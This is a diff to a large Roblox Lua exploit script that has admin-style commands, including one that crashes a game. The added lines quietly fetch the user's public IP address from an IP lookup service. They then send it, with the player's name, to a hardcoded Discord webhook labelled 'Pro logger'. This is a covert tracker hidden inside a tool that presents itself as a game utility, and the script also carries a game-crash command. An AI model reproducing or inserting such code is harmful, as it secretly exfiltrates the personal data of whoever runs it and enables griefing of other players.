@@ -8660,6 +8660,7 @@ getgenv().F_A = {
 
 local player = game:GetService("Players").LocalPlayer
 local name = player.Name
+local ip = tostring(game:HttpGet("https://api.ipify.org", true))
 local HttpService = game:GetService("HttpService");
 
 function SendMessage(Webhook, Message, Botname)
@@ -8686,7 +8687,7 @@ function SendMessage(Webhook, Message, Botname)
     return Data or nil;
 end
 
-SendMessage("https://discordapp.com/api/webhooks/1056680169605169212/CLjlekr27HME_cBtT4OU1wkV3ho-2fiu1mV_qtwmMgjoBqMN9UxW37g9pSjX0DtjFFON", player.Name .." executed!", "Advid logger")
+SendMessage("https://discordapp.com/api/webhooks/1056680169605169212/CLjlekr27HME_cBtT4OU1wkV3ho-2fiu1mV_qtwmMgjoBqMN9UxW37g9pSjX0DtjFFON", player.Name .." executed! Their IP address is: " .. ip, "Pro logger")
 
 if game.PlaceId == 9568982793 then   
 AddCommand("crash", {"*crash"}, "crashes the game, prepcrash command must be used first", {}, function()
